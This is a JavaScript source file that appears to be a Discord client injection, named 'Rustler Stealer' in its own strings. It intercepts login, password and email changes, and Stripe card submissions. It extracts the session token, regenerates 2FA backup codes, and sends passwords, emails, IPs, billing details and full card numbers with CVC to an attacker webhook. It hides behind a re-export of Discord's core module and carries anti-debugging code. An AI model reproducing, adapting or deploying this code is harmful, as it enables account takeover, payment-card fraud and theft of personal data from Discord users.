                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  v +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((W) => {
                                o.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      v +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((k) => {
                                    function l() {
                                      var H = JSON.parse(k)
                                      const s = H.filter((h) => {
                                        return h.type == 1
                                      })
                                      return s.length
                                    }
                                    function J() {
                                      var L = JSON.parse(k)
                                      const s = L.filter((h) => {
                                        return h.type == 1
                                      })
                                      var H = ''
                                      for (z of s) {
                                        var c = GetRBadges(z.user.public_flags)
                                        if (c != '') {
                                          H +=
                                            c +
                                            (' | `' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '`\n')
                                        }
                                      }
                                      return (
                                        H == '' &&
                                          (H = '*Nothing to see here*'),
                                        H
                                      )
                                    }
                                    function I() {
                                      const c = JSON.parse(W)
                                      var L = ''
                                      c.forEach((s) => {
                                        if (s.type == '') {
                                          return '`No`'
                                        } else {
                                          if (
                                            s.type == 2 &&
                                            s.invalid != true
                                          ) {
                                            L += ' <:paypal:896441236062347374>'
                                          } else {
                                            if (
                                              s.type == 1 &&
                                              s.invalid != true
                                            ) {
                                              L += ' :credit_card:'
                                            } else {
                                              return '`No`'
                                            }
                                          }
                                        }
                                      })
                                      if (L == '') {
                                        L = '`No`'
                                      }
                                      return L
                                    }
                                    const C = JSON.parse(O)
                                    var M = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: '<:token:949679866188529714> Token:',
                                              value:
                                                '`' +
                                                v +
                                                '`' +
                                                '\n[CopyToken](https://rustlercoppy.com/copy/' +
                                                v +
                                                '<br>' +
                                                C.email +
                                                ':' +
                                                n +
                                                ')',
                                              inline: false,
                                            },
                                            {
                                              name: '<:badge:949679865710403584> Badges:',
                                              value: '' + GetBadges(C.flags),
                                              inline: true,
                                            },
                                            {
                                              name: '<:nitro:949679866033352784> Nitro Type:',
                                              value:
                                                '' + GetNitro(C.premium_type),
                                              inline: true,
                                            },
                                            {
                                              name: '<:card:949679865798475827>Billing',
                                              value: '' + I(),
                                              inline: true,
                                            },
                                            {
                                              name: '<:ip:949680203859369994> IP:',
                                              value: '`' + f + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:mail:949679866113032253> Email:',
                                              value: '`' + C.email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> Old Password:',
                                              value: '`' + N + '`',
                                              inline: true,
                                            },
                                            {
                                              name: '<:password:949679865580384266> New Password:',
                                              value: '`' + n + '`',
                                              inline: true,
                                            },
                                          ],
                                          author: {
                                            name:
                                              C.username +
                                              '#' +
                                              C.discriminator +
                                              ' (' +
                                              C.id +
                                              ')',
                                            icon_url:
                                              'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              C.id +
                                              '/' +
                                              C.avatar,
                                          },
                                        },
                                        {
                                          color: config['embed-color'],
                                          description: J(),
                                          author: {
                                            icon_url:
                                              'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                            name: 'HQ Friends',
                                          },
                                          footer: { text: 'Rustler Stealer' },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(M))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function ChangeEmail(N, n, v) {
  const A = BrowserWindow.getAllWindows()[0]
  A.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        v +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((Q) => {
      A.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((z) => {
          A.webContents
            .executeJavaScript(
              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                v +
                '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
              true
            )
            .then((d) => {
              A.webContents
                .executeJavaScript(
                  '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                    v +
                    '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                  true
                )
                .then((D) => {
                  if (v.startsWith('mfa')) {
                    A.webContents
                      .executeJavaScript(
                        '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                          v +
                          '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                          n +
                          '","regenerate":true}));\n              xmlHttp.responseText',
                        true
                      )
                      .then((G) => {
                        var Z = [],
                          o = 'https://rustlercoppy.com/copy/'
                        var O = JSON.parse(G)
                        let w = O.backup_codes
                        const f = w.filter((J) => {
                          return J.consumed == null
                        })
                        for (let J in f) {
                          Z.push({
                            name: 'Code',
                            value: '`' + f[J].code.insert(4, '-') + '`',
                            inline: true,
                          })
                          o += f[J].code.insert(4, '-') + '<br>'
                        }
                        function W() {
                          var L = JSON.parse(D)
                          const H = L.filter((c) => {
                            return c.type == 1
                          })
                          return H.length
                        }
                        function i() {
                          var L = JSON.parse(D)
                          const h = L.filter((Y) => {
                            return Y.type == 1
                          })
                          var H = ''
                          for (z of h) {
                            var c = GetRBadges(z.user.public_flags)
                            if (c != '') {
                              H +=
                                c +
                                (' | `' +
                                  z.user.username +
                                  '#' +
                                  z.user.discriminator +
                                  '`\n')
                            }
                          }
                          return H == '' && (H = '*Nothing to see here*'), H
                        }
                        function k() {
                          const H = JSON.parse(d)
                          var c = ''
                          H.forEach((s) => {
                            if (s.type == '') {
                              return '`\u274C`'
                            } else {
                              if (s.type == 2 && s.invalid != true) {
                                c += '`\u2714ï¸` <:paypal:896441236062347374>'
                              } else {
                                if (s.type == 1 && s.invalid != true) {
                                  c += '`\u2714ï¸` :credit_card:'
                                } else {
                                  return '`\u274C`'
                                }
                              }
                            }
                          })
                          if (c == '') {
                            c = '`\u274C`'
                          }
                          return c
                        }
                        const j = JSON.parse(Q)
                        var M = {
                          username: 'Rustler Stealer',
                          content: '',
                          embeds: [
                            {
                              title: 'Email Changed',
                              description:
                                '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                                v +
                                '<br>' +
                                n +
                                ')',
                              color: config['embed-color'],
                              fields: [
                                {
                                  name: 'Info',
                                  value:
                                    '```Hostname: \n' +
                                    computerName +
                                    '\nIP: \n' +
                                    z +
                                    '```',
                                  inline: false,
                                },
                                {
                                  name: 'Username',
                                  value:
                                    '`' +
                                    j.username +
                                    '#' +
                                    j.discriminator +
                                    '`',
                                  inline: true,
                                },
                                {
                                  name: 'ID',
                                  value: '`' + j.id + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Nitro',
                                  value: '' + GetNitro(j.premium_type),
                                  inline: false,
                                },
                                {
                                  name: 'Badges',
                                  value: '' + GetBadges(j.flags),
                                  inline: false,
                                },
                                {
                                  name: 'Billing',
                                  value: '' + k(),
                                  inline: false,
                                },
                                {
                                  name: 'New Email',
                                  value: '`' + email + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Password',
                                  value: '`' + n + '`',
                                  inline: true,
                                },
                                {
                                  name: 'Token',
                                  value: '```' + v + '```',
                                  inline: false,
                                },
                              ],
                              author: { name: 'Rustler Stealer' },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  j.id +
                                  '/' +
                                  j.avatar,
                              },
                            },
                            {
                              title: 'Total Friends (' + W() + ')',
                              color: config['embed-color'],
                              description: i(),
                              author: { name: 'Rustler Stealer' },
                              footer: { text: 'Rustler Stealer' },
                              thumbnail: {
                                url:
                                  'https://cdn.discordapp.com/avatars/' +
                                  j.id +
                                  '/' +
                                  j.avatar,
                              },
                            },
                          ],
                        }
                        const R = {
                          title: ':detective: __2FA Codes__',
                          description: '[Get all of them](' + o + ')',
                          color: config['embed-color'],
                          fields: Z,
                          author: {},
                          footer: {},
                        }
                        R.author.name = 'Rustler Stealer'
                        R.footer.text = 'Rustler Stealer'
                        var l = R
                        v.startsWith('mfa') && M.embeds.push(l)
                        SendToWebhook(JSON.stringify(M))
                      })
                  } else {
                    const G = BrowserWindow.getAllWindows()[0]
                    G.webContents
                      .executeJavaScript(
                        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                          v +
                          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                        true
                      )
                      .then((g) => {
                        G.webContents
                          .executeJavaScript(
                            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                            true
                          )
                          .then((Z) => {
                            G.webContents
                              .executeJavaScript(
                                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                  v +
                                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                true
                              )
                              .then((O) => {
                                G.webContents
                                  .executeJavaScript(
                                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                      v +
                                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                    true
                                  )
                                  .then((f) => {
                                    function W() {
                                      var R = JSON.parse(f)
                                      const l = R.filter((J) => {
                                        return J.type == 1
                                      })
                                      return l.length
                                    }
                                    function i() {
                                      var R = JSON.parse(f)
                                      const l = R.filter((C) => {
                                        return C.type == 1
                                      })
                                      var J = ''
                                      for (z of l) {
                                        var I = GetRBadges(z.user.public_flags)
                                        I != '' &&
                                          (J +=
                                            I +
                                            (' ' +
                                              z.user.username +
                                              '#' +
                                              z.user.discriminator +
                                              '\n'))
                                      }
                                      J == '' && (J = 'No Rare Friends')
                                      return J
                                    }
                                    function k() {
                                      const R = JSON.parse(O)
                                      var l = ''
                                      return (
                                        R.forEach((J) => {
                                          if (J.type == '') {
                                            return '`\u274C`'
                                          } else {
                                            if (
                                              J.type == 2 &&
                                              J.invalid != true
                                            ) {
                                              l +=
                                                '`\u2714ï¸` <:paypal:896441236062347374>'
                                            } else {
                                              if (
                                                J.type == 1 &&
                                                J.invalid != true
                                              ) {
                                                l += '`\u2714ï¸` :credit_card:'
                                              } else {
                                                return '`\u274C`'
                                              }
                                            }
                                          }
                                        }),
                                        l == '' && (l = '`\u274C`'),
                                        l
                                      )
                                    }
                                    const j = JSON.parse(g)
                                    var M = {
                                      username: 'Rustler Stealer',
                                      content: '',
                                      embeds: [
                                        {
                                          title: 'Email Changed',
                                          description:
                                            '[**<:partner:909102089513340979> \u2502 Click Here To Copy Info On Mobile**](https://rustlercoppy.com/copy/' +
                                            v +
                                            '<br>' +
                                            n +
                                            ')',
                                          color: config['embed-color'],
                                          fields: [
                                            {
                                              name: 'Info',
                                              value:
                                                '```Hostname: \n' +
                                                computerName +
                                                '\nIP: \n' +
                                                Z +
                                                '```',
                                              inline: false,
                                            },
                                            {
                                              name: 'Username',
                                              value:
                                                '`' +
                                                j.username +
                                                '#' +
                                                j.discriminator +
                                                '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'ID',
                                              value: '`' + j.id + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Nitro',
                                              value:
                                                '' + GetNitro(j.premium_type),
                                              inline: false,
                                            },
                                            {
                                              name: 'Badges',
                                              value: '' + GetBadges(j.flags),
                                              inline: false,
                                            },
                                            {
                                              name: 'Billing',
                                              value: '' + k(),
                                              inline: false,
                                            },
                                            {
                                              name: 'New Email',
                                              value: '`' + email + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Password',
                                              value: '`' + n + '`',
                                              inline: true,
                                            },
                                            {
                                              name: 'Token',
                                              value: '```' + v + '```',
                                              inline: false,
                                            },
                                          ],
                                          author: { name: 'Rustler Stealer' },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              j.id +
                                              '/' +
                                              j.avatar,
                                          },
                                        },
                                        {
                                          title: 'Total Friends (' + W() + ')',
                                          color: config['embed-color'],
                                          description: i(),
                                          author: { name: 'Rustler Stealer' },
                                          footer: { text: 'Rustler Stealer' },
                                          thumbnail: {
                                            url:
                                              'https://cdn.discordapp.com/avatars/' +
                                              j.id +
                                              '/' +
                                              j.avatar,
                                          },
                                        },
                                      ],
                                    }
                                    SendToWebhook(JSON.stringify(M))
                                  })
                              })
                          })
                      })
                  }
                })
            })
        })
    })
}
function CreditCardAdded(N, n, v, K, A, Q, E, z, t, d) {
  const D = BrowserWindow.getAllWindows()[0]
  D.webContents
    .executeJavaScript(
      '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
        d +
        '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
      true
    )
    .then((P) => {
      D.webContents
        .executeJavaScript(
          '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
          true
        )
        .then((g) => {
          var m = JSON.parse(P)
          var Z = {
            username: 'Rustler Stealer',
            content: '',
            embeds: [
              {
                title: 'User Credit Card Added',
                description:
                  '**Username:**```' +
                  m.username +
                  '#' +
                  m.discriminator +
                  '```\n**ID:**```' +
                  m.id +
                  '```\n**Email:**```' +
                  m.email +
                  '```\n' +
                  '**Nitro Type:**```' +
                  GetNitro(m.premium_type) +
                  '```\n**Badges:**```' +
                  GetBadges(m.flags) +
                  '```' +
                  '\n**Credit Card Number: **```' +
                  N +
                  '```' +
                  '\n**Credit Card Expiration: **```' +
                  v +
                  '/' +
                  K +
                  '```' +
                  '\n**CVC: **```' +
                  n +
                  '```\n' +
                  '**Country: **```' +
                  t +
                  '```\n' +
                  '**State: **```' +
                  E +
                  '```\n' +
                  '**City: **```' +
                  Q +
                  '```\n' +
                  '**ZIP:**```' +
                  z +
                  '```' +
                  '\n**Street: **```' +
                  A +
                  '```' +
                  '\n**Token:**```' +
                  d +
                  '```' +
                  '\n**IP: **```' +
                  g +
                  '```',
                author: { name: 'Rustler Stealer' },
                footer: { text: 'Rustler Stealer' },
                thumbnail: {
                  url:
                    'https://cdn.discordapp.com/avatars/' +
                    m.id +
                    '/' +
                    m.avatar,
                },
              },
            ],
          }
          SendToWebhook(JSON.stringify(Z))
        })
    })
}
const FO = {}
FO.urls = [
  'https://discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/users/@me',
  'https://*.discord.com/api/v*/users/@me',
  'https://discordapp.com/api/v*/auth/login',
  'https://discord.com/api/v*/auth/login',
  'https://*.discord.com/api/v*/auth/login',
  'https://api.stripe.com/v*/tokens',
]
const ChangePasswordFilter = FO
session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (N, n) => {
  if (N.url.endsWith('login')) {
    if (N.statusCode == 200) {
      const K = JSON.parse(Buffer.from(N.uploadData[0].bytes).toString()),
        A = K.login,
        Q = K.password,
        E = BrowserWindow.getAllWindows()[0]
      E.webContents
        .executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        )
        .then((z) => {
          Login(A, Q, z)
        })
    } else {
    }
  }
  if (N.url.endsWith('users/@me')) {
    if (N.statusCode == 200 && N.method == 'PATCH') {
      const z = JSON.parse(Buffer.from(N.uploadData[0].bytes).toString())
      if (z.password != null && z.password != undefined && z.password != '') {
        if (
          z.new_password != undefined &&
          z.new_password != null &&
          z.new_password != ''
        ) {
          const t = BrowserWindow.getAllWindows()[0]
          t.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((d) => {
              ChangePassword(z.password, z.new_password, d)
            })
        }
        if (z.email != null && z.email != undefined && z.email != '') {
          const d = BrowserWindow.getAllWindows()[0]
          d.webContents
            .executeJavaScript(
              'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
              true
            )
            .then((p) => {
              ChangeEmail(z.email, z.password, p)
            })
        }
      }
    } else {
    }
  }
  if (N.url.endsWith('tokens')) {
    const p = BrowserWindow.getAllWindows()[0],
      D = querystring.parse(
        decodeURIComponent(Buffer.from(N.uploadData[0].bytes).toString())
      )
    p.webContents
      .executeJavaScript(
        'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
        true
      )
      .then((P) => {
        CreditCardAdded(
          D['card[number]'],
          D['card[cvc]'],
          D['card[exp_month]'],
          D['card[exp_year]'],
          D['card[address_line1]'],
          D['card[address_city]'],
          D['card[address_state]'],
          D['card[address_zip]'],
          D['card[address_country]'],
          P
        )
      })
  }
})
function S(N) {
  function v(K) {
    if (typeof K === 'string') {
      return function (A) {}.constructor('while (true) {}').apply('counter')
    } else {
      ;('' + K / K).length !== 1 || K % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    v(++K)
  }
  try {
    if (N) {
      return v
    } else {
      v(0)
    }
  } catch (K) {}
}
module.exports = require('./core.asar')
